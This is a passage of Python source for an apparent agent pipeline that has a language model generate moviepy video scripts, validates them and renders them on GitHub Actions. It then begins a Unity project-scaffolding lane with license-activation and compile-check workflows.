- Captions/text: if captions or titles are part of the idea, style them deliberately (readable font size/color, a semi-transparent background box or stroke/shadow so text is legible over any footage, sensible on-screen duration synced to content, positioned with safe margins away from the very edge of frame) — not default tiny black-on-white TextClip text dropped in a corner. Time captions to when the relevant word/beat is actually said or shown, not just evenly spread across the timeline.
- Narration: if the storyboard marks narration as required, synthesize it with gTTS as instructed below and treat it as the primary audio — sync captions and scene timing to the real narration duration, not a guess.
- Audio: if there's a music/voice track, normalize levels and duck background music under any voice/dialogue (lower music volume during speech, e.g. via volumex on the relevant sub-clips) rather than leaving competing full-volume tracks. Fade audio in/out at the start/end instead of cutting it abruptly. Silence for the whole runtime reads as unfinished — if the idea has no explicit voice/music, still add a subtle generated tone bed or sound design pass rather than leaving the track empty, unless the idea is explicitly silent.
- Background music sourcing: when a music mood/genre is called for and isn't "none", fetch a real royalty-free track at runtime rather than a synthetic tone. Download the catalog at "https://incompetech.com/music/royalty-free/collections.json" (requests, timeout=30), pick a track whose genre/title best matches the requested mood (fall back to any track if matching fails), then download its mp3 from "https://incompetech.com/music/royalty-free/mp3-royaltyfree/<filename>.mp3". Loop or trim it to the video's total length, duck it under narration, fade in/out, and add a small on-screen or description-style credit line ("Music: <track title> by Kevin MacLeod (incompetech.com), CC BY 4.0") since the license requires attribution. If the download fails for any reason, catch it and fall back to a generated ambient tone bed instead of blocking the whole render.
- Real footage editing: when a scene's visual comes from existing source footage (a URL given in the idea or storyboard), download it once with requests (stream=True, raise_for_status, chunked write to local .mp4), then use VideoFileClip(...).subclip(start, end) for trims/cuts, concatenate_videoclips for multi-cut sequences, and moviepy.video.fx.speedx for slow-motion/timelapse speed changes. Apply any requested color grade with moviepy.video.fx (colorx for saturation/warmth, lum_contrast for contrast/brightness, or a manual per-frame LUT-style tweak) rather than leaving raw footage untouched.
- Watermark/branding: if the idea or storyboard calls for a watermark/logo/handle, composite it as a low-opacity TextClip or ImageClip pinned to a corner (commonly bottom-right) with a safe margin, present for the entire duration of every exported file (primary and any multi-format/dubbed versions).
- Framing: choose resolution/aspect ratio appropriate to the idea (16:9 e.g. 1280x720 for general/YouTube-style, 9:16 e.g. 720x1280 for shorts/reels/TikTok-style, 1:1 e.g. 720x720 for square/social feed) based on what the idea implies, or the storyboard's aspect_ratio/width/height if one is provided. If source footage doesn't match the target aspect ratio, crop/scale-to-fill deliberately (or letterbox with a blurred/solid background fill) — never leave an unintentional stretch or a naked black bar that looks like a bug.
- The PRIMARY final video MUST be written with clip.write_videofile(\"""" + VIDEO_OUTPUT_FILENAME + """\", codec="libx264", audio_codec="aac", fps=30, preset="fast", bitrate="3500k") — that exact filename, in the current working directory. If the storyboard requests additional export formats (output_formats) or dubbed languages (target_languages), write each of those as its own additional file named exactly as instructed in the storyboard block (e.g. "output_9x16.mp4", "output_es.mp4") using the same write_videofile settings — build the clip-assembly logic as a reusable function so each variant is just a different call into it. Nothing outside these exact filenames will be picked up.
- Keep it short (aim for well under 30 seconds per variant) so each final file stays well under 50MB — large files can fail to upload.
- List "moviepy" (and "imageio-ffmpeg" as a safety net so moviepy always has a working ffmpeg binary even if the system one is missing) plus any other genuinely-needed pip packages (requests, pillow, numpy, "gtts" and/or "edge-tts" if narration is used, etc.) separately from the code.
- Never hide errors behind a fake fallback: let moviepy/library failures raise or print the real error and exit(1). Do not report success unless """ + VIDEO_OUTPUT_FILENAME + """ actually exists and is non-empty at the end (additional format/language files are best-effort on top of that: if one of them fails, print the error clearly but don't fail the whole job over it as long as the primary output exists)."""

    storyboard_section = ("\n\n" + storyboard_block + "\n") if storyboard_block else ""

    if previous_error:
        prompt = """Write a complete, standalone Python script for this video-editing/creation task: """ + idea + storyboard_section + """

Previous attempt failed:
""" + previous_error + """

Fix the ROOT CAUSE. """ + base_rules + lessons_block + """
Reply in this format:
CODE:
<code>
REQUIREMENTS:
<pip packages, one per line, or NONE>"""
    else:
        prompt = """Write a complete, standalone Python script for this video-editing/creation task: """ + idea + storyboard_section + """

""" + base_rules + lessons_block + """
Reply in this format:
CODE:
<code>
REQUIREMENTS:
<pip packages, one per line, or NONE>"""

    response = ask_ai(prompt)
    retry_count = 0
    while response.startswith("ERROR") and retry_count < 2:
        time.sleep(5)
        response = ask_ai(prompt)
        retry_count += 1

    if "REQUIREMENTS:" in response:
        code_part, req_part = response.split("REQUIREMENTS:", 1)
        code = strip_fences(code_part.replace("CODE:", "").strip())
        requirements = req_part.strip()
    else:
        code = strip_fences(response.replace("CODE:", "").strip())
        requirements = ""

    # Second-pass self-critique against the same professional checklist —
    # catches things like "concatenated with hard cuts" or "captions with
    # no styling" that satisfy the letter of the prompt but not the bar.
    code = strip_fences(_senior_review_pass(
        idea, code, base_rules + storyboard_section, "Python moviepy video-editing script",
        "Reply in this exact format, no extra commentary:\nCODE:\n<complete corrected code>\nREQUIREMENTS:\n<pip packages, one per line, or NONE>"
    ))
    if "REQUIREMENTS:" in code:
        code_part2, req_part2 = code.split("REQUIREMENTS:", 1)
        code = strip_fences(code_part2.replace("CODE:", "").strip())
        if req_part2.strip():
            requirements = req_part2.strip()

    write_file(VIDEO_CODE_FILE, code)
    cleaned = [l.strip().strip("`") for l in requirements.split("\n") if l.strip() and l.strip().upper() != "NONE"]
    # Safety net: if the storyboard calls for narration, make sure gtts is
    # actually installed even if the model forgot to list it — a missing
    # requirement would only surface as a confusing ImportError deep into
    # a GitHub Actions run otherwise.
    if storyboard and storyboard.get("use_narration") and not any("gtts" in l.lower() for l in cleaned):
        cleaned.append("gTTS")
    requirements = "\n".join(cleaned)
    if requirements:
        write_file(VIDEO_REQUIREMENTS_FILE, requirements)
    elif os.path.exists(VIDEO_REQUIREMENTS_FILE):
        os.remove(VIDEO_REQUIREMENTS_FILE)
    return code

def check_video_output_structural(code, idea, storyboard=None):
    """
    Static QA pass on the generated moviepy script itself, run before it's
    pushed and burns GitHub Actions minutes. Cheap to run, and catches
    scripts that are functionally fine but skip the craft the base_rules
    asked for (e.g. writes the file correctly but never touches a
    transition, caption style, or audio level) so a rebuild gets triggered
    instead of shipping something a real editor would call unfinished.
    When a storyboard is provided, also checks that its concrete asks
    (narration, pre-generated scene assets) actually made it into the code
    instead of being silently dropped by the code-gen pass.
    """
    problems = []
    lower = code.lower()
    if "write_videofile" not in lower:
        problems.append("Script never calls write_videofile — no output would be produced.")
    if VIDEO_OUTPUT_FILENAME.lower() not in lower:
        problems.append("Script doesn't reference the required output filename '" + VIDEO_OUTPUT_FILENAME + "'.")
    multi_clip_signals = ["concatenate_videoclips", "compositevideoclip"]
    if any(sig in lower for sig in multi_clip_signals):
        if "crossfadein" not in lower and "crossfadeout" not in lower and "fadein" not in lower and "fadeout" not in lower:
            problems.append("Multiple clips/scenes are combined but no crossfade/fade transition was found — likely hard cuts only.")
    if "textclip" in lower:
        if "fontsize" not in lower and "font_size" not in lower:
            problems.append("Captions/titles are used but no explicit font size was set.")
        if "bg_color" not in lower and "stroke_color" not in lower and "color=" not in lower:
            problems.append("Captions/titles are used but no explicit styling (color/stroke/background) was found — likely default tiny text.")
    if "audiofileclip" in lower or "audioclip" in lower:
        if "volumex" not in lower and "audio_normalize" not in lower and "fadein" not in lower:
            problems.append("Audio is used but no level control (volumex/normalize/fade) was found.")
    if storyboard:
        has_tts = ("gtts" in lower) or ("edge_tts" in lower) or ("edge-tts" in lower)
        if storyboard.get("use_narration") and (not has_tts or "audiofileclip" not in lower):
            problems.append("Storyboard requires narration but the script doesn't generate it with gtts/edge-tts and/or never loads it with AudioFileClip.")
        asset_paths = [s.get("asset_path") for s in storyboard.get("scenes", []) if s.get("asset_path")]
        missing_assets = [p for p in asset_paths if p.lower() not in lower]
        if missing_assets:
            problems.append("Storyboard has pre-generated scene image(s) that the script never references: " + ", ".join(missing_assets) + ".")
        footage_scenes = [s for s in storyboard.get("scenes", []) if s.get("visual_source") == "source_footage" and s.get("source_url")]
        if footage_scenes and "subclip" not in lower:
            problems.append("Storyboard has real source-footage scene(s) but the script never calls .subclip(...) to trim them.")
        output_formats = [f for f in storyboard.get("output_formats", []) if f and f != storyboard.get("aspect_ratio")]
        if output_formats:
            dims_tag = {"16:9": "output_16x9.mp4", "9:16": "output_9x16.mp4", "1:1": "output_1x1.mp4"}
            missing_formats = [dims_tag[f] for f in output_formats if f in dims_tag and dims_tag[f].lower() not in lower]
            if missing_formats:
                problems.append("Storyboard requires extra export format(s) that the script never writes: " + ", ".join(missing_formats) + ".")
        target_languages = storyboard.get("target_languages", [])
        if target_languages:
            missing_langs = [lang for lang in target_languages if ("output_" + lang.lower() + ".mp4") not in lower]
            if missing_langs:
                problems.append("Storyboard requires dubbed language export(s) that the script never writes: " + ", ".join("output_" + l + ".mp4" for l in missing_langs) + ".")
        watermark_text = str(storyboard.get("watermark_text", "")).strip()
        if watermark_text and "textclip" not in lower and "imageclip" not in lower:
            problems.append("Storyboard requires a watermark but the script has no overlay clip for it.")
        music_mood = str(storyboard.get("music_mood", "none")).strip().lower()
        if music_mood and music_mood != "none" and "incompetech" not in lower:
            problems.append("Storyboard requests background music but the script doesn't source a real royalty-free track from incompetech's catalog.")
    if not problems:
        return True, "Structurally OK."
    return False, "; ".join(problems)

def ensure_video_runner_yaml(repo_name):
    yaml_content = """name: Run Video Job
on:
  workflow_dispatch:
jobs:
  run:
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: sudo apt-get update -qq && sudo apt-get install -y -qq ffmpeg
      - run: if [ -f video_requirements.txt ]; then pip install -r video_requirements.txt; fi
      - run: python video_job.py
        env:
          CEREBRAS_API_KEY: ${{ secrets.CEREBRAS_API_KEY }}
      - name: Commit rendered video back to repo
        if: success()
        run: |
          if [ -s """ + VIDEO_OUTPUT_FILENAME + """ ]; then
            mkdir -p videos/${{ github.run_id }}
            # Move the primary output plus any extra format/dubbed variants
            # (output_9x16.mp4, output_es.mp4, etc.) the script may have
            # produced alongside it — every variant lands in the same
            # run-id folder so all of them get a stable permanent URL.
            mv """ + VIDEO_OUTPUT_FILENAME + """ videos/${{ github.run_id }}/""" + VIDEO_OUTPUT_FILENAME + """
            for f in output_*.mp4; do
              [ -s "$f" ] && mv "$f" "videos/${{ github.run_id }}/$f"
            done
            git config user.name "agent-bot"
            git config user.email "agent-bot@users.noreply.github.com"
            git add -f videos/${{ github.run_id }}/
            git commit -m "Add rendered video (run ${{ github.run_id }})" || echo "nothing to commit"
            # BUG FIX: VIDEO_REPO_NAME is a single shared repo across the
            # root agent AND every spawned agent (spawned agents get a
            # full copy of this engine but no per-agent repo namespacing
            # for the video lane). Two renders finishing around the same
            # time both push here, and each render lands in its own
            # videos/<run_id>/ folder so there's never a real content
            # conflict — but a bare `git push` still fails outright on a
            # non-fast-forward rejection if the remote moved since this
            # runner's checkout. Retry with a rebase pull a few times
            # before giving up, since the only thing that could have
            # changed upstream is another run's own non-overlapping
            # videos/<run_id>/ folder.
            n=0
            until git push || [ $n -ge 5 ]; do
              n=$((n+1))
              echo "push rejected (attempt $n/5) — pulling and retrying..."
              sleep $((RANDOM % 5 + 1))
              git pull --rebase origin main
            done
          else
            echo "No non-empty """ + VIDEO_OUTPUT_FILENAME + """ was produced" && exit 1
          fi
"""
    return create_github_file(repo_name, ".github/workflows/run.yml", yaml_content, "Add video runner workflow")

def _expected_video_variant_tags(storyboard):
    """
    Builds the list of extra output_<tag>.mp4 filenames a given storyboard
    should have produced, beyond the always-required primary output.mp4 —
    used so validate_video_on_github knows which URLs to hand back without
    having to query GitHub for a directory listing.
    """
    tags = []
    if not storyboard:
        return tags
    dims_tag = {"16:9": "16x9", "9:16": "9x16", "1:1": "1x1"}
    for fmt in storyboard.get("output_formats", []):
        if fmt and fmt != storyboard.get("aspect_ratio") and fmt in dims_tag:
            tags.append(dims_tag[fmt])
    for lang in storyboard.get("target_languages", []):
        if lang:
            tags.append(str(lang).lower())
    return tags

def validate_video_on_github(repo_name, storyboard=None):
    """
    Pushes the generated job + triggers it on GitHub Actions. Each render
    is committed under videos/<run_id>/ (run_id is unique and
    monotonically increasing per repo) instead of a single shared
    filename, so every past video keeps a permanent, non-overwritten URL.
    Returns (success, result) where result is a dict {"primary": url, ...}
    keyed by variant tag ("9x16", "es", etc.) on success, or an
    error string on failure.
    """
    username = get_github_username()
    if not username:
        return False, "Could not determine GitHub username."
    print(create_github_repo(repo_name, description="Video jobs rendered by my agent"))
    push_result = create_github_file(repo_name, "video_job.py", read_file(VIDEO_CODE_FILE), "Update video_job.py")
    print(push_result)
    if push_result.startswith("ERROR") or push_result.startswith("Could not"):
        return False, push_result
    if os.path.exists(VIDEO_REQUIREMENTS_FILE):
        print(create_github_file(repo_name, "video_requirements.txt", read_file(VIDEO_REQUIREMENTS_FILE), "Update video requirements"))
    print(ensure_video_runner_yaml(repo_name))
    time.sleep(5)
    previous_run = get_latest_run(repo_name, "run.yml")
    previous_run_id = previous_run.get("id") if previous_run is not None else None
    triggered, msg = trigger_github_workflow(repo_name, "run.yml")
    if not triggered:
        return False, msg
    print("Waiting for GitHub Actions to render the video (this can take a couple of minutes)...")
    run = wait_for_run_completion(repo_name, previous_run_id=previous_run_id, timeout_seconds=600)
    if not run or run.get("id") == previous_run_id:
        return False, "Run did not complete within timeout."
    if run.get("conclusion") == "success":
        base = "https://raw.githubusercontent.com/" + username + "/" + repo_name + "/main/videos/" + str(run.get("id")) + "/"
        urls = {"primary": base + VIDEO_OUTPUT_FILENAME}
        for tag in _expected_video_variant_tags(storyboard):
            urls[tag] = base + "output_" + tag + ".mp4"
        return True, urls
    return False, get_run_logs(repo_name, run.get("id"))[-3000:]

def find_matching_video_tool(idea):
    video_tools = [t for t in load_tools_index() if t.get("type") == "video"]
    if not video_tools:
        return None
    ranked = semantic_rank(idea, {t["id"]: t["idea"] for t in video_tools})
    top_ids = {doc_id for doc_id, _ in ranked[:SEMANTIC_PREFILTER_TOP_K]} if ranked else {t["id"] for t in video_tools}
    narrowed = [t for t in video_tools if t["id"] in top_ids] or video_tools
    listing = "\n".join(t["id"] + ": " + t["idea"] for t in narrowed)
    prompt = """Video tools already built:
""" + listing + """

New request: """ + idea + """

Does an existing tool already do this (same edit/creation, not just "also a video")? Reply with ONLY the tool id or NONE."""
    answer = ask_ai(prompt).strip()
    for t in narrowed:
        if t["id"] == answer and is_tool_trustworthy(t):
            return t
    return None

def register_video_tool(idea, url, repo_name):
    time_sensitive = is_time_sensitive(idea)
    with _tools_index_lock:
        index = load_tools_index()
        tool_id = _next_tool_id(index)
        index.append({
            "id": tool_id, "idea": idea, "type": "video", "url": url, "repo_name": repo_name,
            "good_runs": 0, "bad_runs": 0, "time_sensitive": time_sensitive
        })
        save_tools_index(index)
    return tool_id

def build_and_fix_video_workflow(idea_raw):
    idea, force, rival = parse_flags(idea_raw)

    if not force:
        existing = find_matching_video_tool(idea)
        if existing:
            print("Found existing video tool: " + existing["id"] + " — re-rendering...")
            username = get_github_username()
            previous_run = get_latest_run(existing["repo_name"], "run.yml")
            previous_run_id = previous_run.get("id") if previous_run is not None else None
            triggered, msg = trigger_github_workflow(existing["repo_name"], "run.yml")
            if triggered:
                run = wait_for_run_completion(existing["repo_name"], previous_run_id=previous_run_id, timeout_seconds=600)
                if run and run.get("id") != previous_run_id and run.get("conclusion") == "success":
                    update_tool_trust(existing["id"], True)
                    # Re-render lands under a new run-id path — refresh the
                    # stored URL(s) so old links aren't silently pointed at
                    # a missing file next time this tool is looked up.
                    base = ("https://raw.githubusercontent.com/" + username + "/" + existing["repo_name"] +
                            "/main/videos/" + str(run.get("id")) + "/")
                    stored = existing.get("url")
                    if isinstance(stored, dict):
                        new_urls = {tag: base + ("output_" + tag + ".mp4" if tag != "primary" else VIDEO_OUTPUT_FILENAME) for tag in stored}
                        update_tool_url(existing["id"], new_urls)
                        return "Reused video tool " + existing["id"] + ": " + ", ".join(k + "=" + v for k, v in new_urls.items())
                    new_url = base + VIDEO_OUTPUT_FILENAME
                    update_tool_url(existing["id"], new_url)
                    return "Reused video tool " + existing["id"] + ": " + new_url
            update_tool_trust(existing["id"], False)
            if not is_tool_trustworthy(existing):
                retire_tool(existing)
            print("Existing video tool failed, rebuilding...")

    print("Building video job: " + idea)

    print("Planning storyboard...")
    storyboard = plan_video_storyboard(idea)
    if storyboard:
        print("Storyboard: " + str(len(storyboard.get("scenes", []))) + " scene(s), narration="
              + str(storyboard.get("use_narration")) + ", aspect=" + str(storyboard.get("aspect_ratio")))
        generate_video_scene_assets(storyboard, VIDEO_REPO_NAME)
    else:
        print("Storyboard planning failed — falling back to unplanned generation for this build.")

    # BUG FIX: hold _video_code_file_lock for the whole build+retry cycle,
    # starting from this initial write — see the lock's definition above
    # for the full race description.
    with _video_code_file_lock:
        write_code_for_video(idea, storyboard=storyboard)

        for attempt in range(1, MAX_VIDEO_ATTEMPTS + 1):
            print("--- Video attempt " + str(attempt) + " ---")

            sec_passed, sec_reason = check_security(read_file(VIDEO_CODE_FILE))
            if not sec_passed:
                output = "Blocked before pushing to GitHub by security scan (AST): " + sec_reason
                print(output)
            else:
                struct_passed, struct_reason = check_video_output_structural(read_file(VIDEO_CODE_FILE), idea, storyboard=storyboard)
                if not struct_passed:
                    output = "Blocked before pushing to GitHub by quality check: " + struct_reason
                    print(output)
                else:
                    success, output = validate_video_on_github(VIDEO_REPO_NAME, storyboard=storyboard)
                    if success:
                        urls = output  # validate_video_on_github returns a dict of {tag: url} on success
                        tool_id = register_video_tool(idea, urls, VIDEO_REPO_NAME)
                        primary_url = urls.get("primary", "")
                        extra = {k: v for k, v in urls.items() if k != "primary"}
                        summary = "Video built after " + str(attempt) + " attempt(s), saved as " + tool_id + ". Watch/download: " + primary_url
                        if extra:
                            summary += "\nAdditional variants: " + ", ".join(k + ": " + v for k, v in extra.items())
                        return summary
                    print("Failed:\n" + output)

            category = categorize_failure(output)
            lesson = reflect_on_failure(idea, output)
            maybe_create_precheck(category, lesson or "")
            if lesson:
                print("Learned: " + lesson)

            if attempt < MAX_VIDEO_ATTEMPTS:
                write_code_for_video(idea, previous_error=output, storyboard=storyboard)
            else:
                return "Could not build video after " + str(MAX_VIDEO_ATTEMPTS) + " attempts. Last problem:\n" + output
        return "Unexpected end of retry loop."

# ============================================================
# UNITY BUILD LANE
# SCRIPT-ONLY: no Unity Editor and no Unity license (personal or pro)
# is available to this agent, so this lane cannot do what the video lane
# does (push code, trigger a GitHub Actions runner, wait for a real
# rendered artifact). A real build would need game-ci/unity-builder,
# which requires a Unity account's UNITY_EMAIL/UNITY_PASSWORD/
# UNITY_LICENSE stored as GitHub secrets, activated once by hand in a
# browser — not something this agent can do for itself.
# Instead this lane produces a real, structurally-validated Unity
# project scaffold (C# MonoBehaviour/NetworkBehaviour scripts, a
# hand-generated but real Assets/Scenes/Main.unity scene with those
# scripts already attached to GameObjects, and minimal ProjectSettings/
# Packages layout) pushed to its own GitHub repo, ready to open directly
# in the Unity Editor. Multiplayer requests use Unity's own Netcode for
# GameObjects package rather than raw sockets/HTTP (see the networking
# exception in write_code_for_unity). If a Unity Personal license is ever
# activated by hand and its 3 secrets added to UNITY_REPO_NAME's repo, a
# real ensure_unity_runner_yaml()/validate_unity_on_github() pair
# (mirroring the video lane's ensure_video_runner_yaml/
# validate_video_on_github) can be dropped in later to upgrade this to
# real compiled builds.
# ============================================================

UNITY_REPO_NAME = "agent-unity-tools"
UNITY_EDITOR_VERSION = "2022.3.21f1"  # a stable LTS — pinned explicitly so game-ci doesn't need a ProjectVersion.txt to infer it
MAX_UNITY_ATTEMPTS = 3
_unity_build_lock = threading.Lock()

def ensure_unity_activation_workflow(repo_name):
    """
    ONE-TIME, manually-triggered workflow. Requests a Unity activation
    file (.alf), exchanges it for a real license (.ulf) by logging into
    Unity with UNITY_EMAIL/UNITY_PASSWORD, then writes that license back
    into the repo as the UNITY_LICENSE secret using ACCESS_TOKEN (a
    GitHub PAT with repo scope — separate from the default GITHUB_TOKEN,
    which can't create/update secrets). Safe to push repeatedly; only
    needs to actually be run (from the Actions tab) once — and again
    whenever a Personal license expires and needs reactivating.
    """
    yaml_content = """name: Activate Unity License (run manually, once)
on:
  workflow_dispatch:
jobs:
  activate:
    runs-on: ubuntu-latest
    steps:
      - name: Request activation file
        uses: game-ci/unity-request-activation-file@v2
        id: activation
      - name: Upload activation file artifact
        uses: actions/upload-artifact@v4
        with:
          name: unity-activation-file
          path: ${{ steps.activation.outputs.filePath }}
      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '18'
      - name: Install unity-license-activate
        run: npm install --global unity-license-activate
      - name: Exchange activation file for a real license
        run: unity-license-activate "${{ secrets.UNITY_EMAIL }}" "${{ secrets.UNITY_PASSWORD }}" "${{ steps.activation.outputs.filePath }}"
      - name: Read the resulting .ulf license
        id: ulfRead
        uses: juliangruber/read-file-action@v1
        with:
          path: ${{ env.UNITY_LICENSE_FILE }}
      - name: Save it as the UNITY_LICENSE secret
        uses: hmanzur/actions-set-secret@v2.0.0
        with:
          name: 'UNITY_LICENSE'
          value: ${{ steps.ulfRead.outputs.content }}
          repository: ${{ github.repository }}
          token: ${{ secrets.ACCESS_TOKEN }}
"""
    return create_github_file(repo_name, ".github/workflows/unity_activate.yml", yaml_content, "Add one-time Unity license activation workflow")

def ensure_unity_test_runner_yaml(repo_name, slug):
    """
    The real compile-check. Runs an actual Unity Editor (via game-ci's
    Docker image) in EditMode against the pushed scripts. EditMode
    requires every script to compile, which is exactly the thing
    check_unity_output_structural() can't verify. On failure the run's
    logs contain real C# compiler errors, which build_and_fix_unity_workflow
    feeds back into write_code_for_unity as previous_error — a genuine
    compiler-in-the-loop, not just a regex heuristic.

    BUG FIX: this used to write a single fixed ".github/workflows/unity_test.yml"
    with no projectPath, which implicitly compiled the ENTIRE repo as one
    Unity project — broken once multiple per-project "games/<slug>/"
    folders (see push_unity_project_to_github's bug fix) live side by
    side in the same repo, since Unity would try to treat unrelated
    games' scripts as one project. Now writes a per-project workflow file
    and points game-ci at that project's own folder specifically, and the
    Library cache is likewise scoped per-project so games don't share (or
    invalidate each other's) compile caches.
    """
    slug = str(slug or "game").strip("/")
    project_root = "games/" + slug
    yaml_content = """name: Unity Compile Check (""" + slug + """)
on:
  workflow_dispatch:
jobs:
  compile_check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          lfs: true
      - uses: actions/cache@v4
        with:
          path: """ + project_root + """/Library
          key: Library-""" + slug + """-${{ hashFiles('""" + project_root + """/Assets/**', '""" + project_root + """/Packages/**') }}
          restore-keys: |
            Library-""" + slug + """-
      - uses: game-ci/unity-test-runner@v4
        id: tests
        env:
          UNITY_LICENSE: ${{ secrets.UNITY_LICENSE }}
          UNITY_EMAIL: ${{ secrets.UNITY_EMAIL }}
          UNITY_PASSWORD: ${{ secrets.UNITY_PASSWORD }}
        with:
          projectPath: """ + project_root + """
          unityVersion: """ + UNITY_EDITOR_VERSION + """
          testMode: editmode
          githubToken: ${{ secrets.GITHUB_TOKEN }}
"""
    workflow_filename = "unity_test_" + slug + ".yml"
    return create_github_file(repo_name, ".github/workflows/" + workflow_filename, yaml_content,
                               "Add Unity EditMode compile-check workflow for " + slug)

def validate_unity_on_github(repo_name, slug):
    """
    Triggers the real Unity EditMode compile check and waits for it.
    Returns (True, message) on a real successful compile, or
    (False, message) otherwise — message is prefixed "MISSING_LICENSE:"
    when the failure looks like the activation step hasn't been run yet
    (as opposed to an actual compile error), so the caller can tell "your
    code is broken" apart from "you haven't set up the license yet" and
    not waste a retry attempt regenerating already-fine code.

    BUG FIX: now takes `slug` and triggers/waits on that project's own
    "unity_test_<slug>.yml" workflow (see ensure_unity_test_runner_yaml)
    instead of a single shared "unity_test.yml" — otherwise, once two
    games' folders live in the same repo, validating game B could pick up
    a stale run that was actually compiling game A (or vice versa).
    """
    slug = str(slug or "game").strip("/")
    workflow_filename = "unity_test_" + slug + ".yml"
    username = get_github_username()
    if not username:
        return False, "Could not determine GitHub username."
    print(ensure_unity_test_runner_yaml(repo_name, slug))
    time.sleep(5)
    previous_run = get_latest_run(repo_name, workflow_filename)
    previous_run_id = previous_run.get("id") if previous_run is not None else None
    triggered, msg = trigger_github_workflow(repo_name, workflow_filename)
    if not triggered:
        return False, msg
    print("Waiting for a real Unity Editor to compile the project on GitHub Actions (first run is slow — it has to download the Unity image)...")
    run = wait_for_run_completion(repo_name, previous_run_id=previous_run_id, timeout_seconds=900)
    if not run or run.get("id") == previous_run_id:
        return False, "Compile-check run did not finish within the timeout — check the Actions tab on " + repo_name + " directly, the Unity image download can be slow on the first run."
    if run.get("conclusion") == "success":
        return True, "Compiled successfully in a real Unity Editor (EditMode compile check)."
    logs = get_run_logs(repo_name, run.get("id"))[-3000:]
    if "UNITY_LICENSE" in logs or "license" in logs.lower() or "activation" in logs.lower():
        return False, "MISSING_LICENSE: " + logs
    return False, logs

def plan_unity_game_design(idea, previous_feedback=""):
    """
    Pre-production pass, same rationale as plan_video_storyboard: commits
    to a concrete script list and mechanic before any C# is written, so
    write_code_for_unity is executing a spec instead of improvising one.
    Returns a dict, or None if planning fails (callers fall back to an
    unplanned single-shot generation).
    """
    feedback_block = ("\n\nThe previous design produced scripts that failed review for this "
        "reason, take it into account: " + previous_feedback) if previous_feedback else ""
    prompt = """You are designing a small Unity game for this request: """ + idea + """

Produce a concrete design as JSON only (no commentary, no markdown fences). Schema:
{
  "title": "<short game title>",
  "genre": "<e.g. 2D platformer, top-down shooter, endless runner>",
  "dimension": "<'2D' or '3D' — pick 3D whenever the idea implies real 3D space, first/third-person, or isn't obviously flat/side-on; default to 2D only for classic flat genres like platformers/top-down-2D>",
  "core_mechanic": "<one or two sentences on what the player actually does>",
  "controls": "<what input drives what, e.g. 'arrow keys/WASD to move, space to jump'>",
  "win_lose_condition": "<how the player wins or loses>",
  "scripts": [
    {
      "filename": "<PascalCase name matching the C# class exactly, e.g. PlayerController.cs>",
      "class_name": "<PascalCase class name, MUST exactly match filename minus .cs>",
      "purpose": "<what this script does>",
      "attach_to": "<what kind of GameObject this MonoBehaviour goes on, e.g. 'Player', 'GameManager', 'Enemy prefab'>"
    }
  ],
  "scene_setup_notes": "<plain-English steps for wiring these scripts into a scene by hand in the Unity Editor: what GameObjects to create, what components/tags/layers they need, what to drag into public fields>",
  "multiplayer": <true or false — true only if the request explicitly asks for multiplayer/online/networked/co-op play>,
  "gameobjects": [
    {
      "name": "<GameObject name in the scene, e.g. 'Player', 'GameManager', 'NetworkManager'>",
      "scripts": ["<filename(s) from the scripts list attached to this GameObject, if any>"],
      "components": ["<built-in Unity components this GameObject needs besides scripts, e.g. 'Rigidbody2D', 'BoxCollider2D', 'SpriteRenderer'>"],
      "position": {"x": <number>, "y": <number>, "z": <number>},
      "primitive": "<one of 'none','Cube','Sphere','Capsule','Cylinder','Plane','Quad' — a built-in Unity primitive mesh to give this object real visible geometry at scene-open time, or 'none' for an empty GameObject like a GameManager>",
      "scale": {"x": <number>, "y": <number>, "z": <number>},
      "notes": "<anything special about this GameObject's setup>"
    }
  ]
}
Guidance:
- 3-6 scripts typically: at minimum a player controller and a game manager; add enemy/obstacle/spawner/UI scripts as the idea calls for.
- Every script must be a real, self-contained MonoBehaviour a competent Unity developer would recognize — no placeholder TODOs.
- Keep scope small enough to realistically hand-wire in one Editor session (single scene). Only set "multiplayer": true if the request explicitly asks for multiplayer/online/networked/co-op play — in that case scripts should use Unity's official Netcode for GameObjects (NetworkBehaviour, [ServerRpc], [ClientRpc], NetworkVariable) rather than raw sockets/HTTP.
- "gameobjects" should cover every GameObject the scene needs (including ones with no script, like a Ground or Canvas), since this list is used to generate a real starter scene file, not just documentation.
- ACTUALLY LAY THE SCENE OUT — don't stack everything at (0,0,0). Give every gameobject a distinct, sensible "position" for its role: in 3D, a ground/floor Plane roughly centered under everything at y≈0 or below, the player a little above it, enemies/pickups/obstacles spread across x/z so they don't overlap; in 2D, spread across x (and y for platforms) using small integer-ish units (Unity units, not pixels). Set "scale" for anything that should be bigger/flatter than default (e.g. a ground Plane scaled up in x/z).
- Give solid/visible objects (ground, walls, enemies, pickups, obstacles) a "primitive" so the scene isn't just empty GameObjects — a Player can use "Capsule" (3D) or "none" with a SpriteRenderer noted in components (2D). Purely logical objects (GameManager, spawners with no body, UI canvases) use "primitive": "none".
- Design around Unity's OWN built-in systems, not reimplementations of them: Rigidbody (3D) or Rigidbody2D (2D) + matching Collider for movement and collision, Unity's Input class for controls, the Animator for animation state, Unity UI (Canvas/Button/Text/Image) for HUD/menus, AudioSource for sound, coroutines for timing. Only design a custom script for game-specific logic that Unity has no built-in for (scoring, spawning rules, enemy AI, win/lose state).
Reply with ONLY the JSON object.""" + feedback_block

    response = ask_ai(prompt)
    retry_count = 0
    while response.startswith("ERROR") and retry_count < 2:
        time.sleep(5)
        response = ask_ai(prompt)
        retry_count += 1
    design = _parse_json_loose(response)
    if not isinstance(design, dict) or not design.get("scripts"):
        return None
    return design

def write_code_for_unity(idea, previous_error="", design=None):
    """
    Generates the actual C# MonoBehaviour scripts (and a couple of
    minimal project-scaffold files) as a dict {relative_path: content}.
    Returns None on total AI failure so the caller can retry/bail
    instead of pushing garbage.
    """
    design_block = ("\n\nFollow this design exactly (one script per entry, filename/class_name must match):\n"
                     + json.dumps(design)) if design else ""
    error_block = ("\n\nThe previous attempt failed review for this reason, fix it: " + previous_error) if previous_error else ""
    multiplayer = bool(design and design.get("multiplayer"))
    if multiplayer:
        networking_rule = ("- This is a MULTIPLAYER game. Use ONLY Unity's official Netcode for GameObjects package for "
            "networking: scripts that need to sync state must inherit from Unity.Netcode.NetworkBehaviour (not "
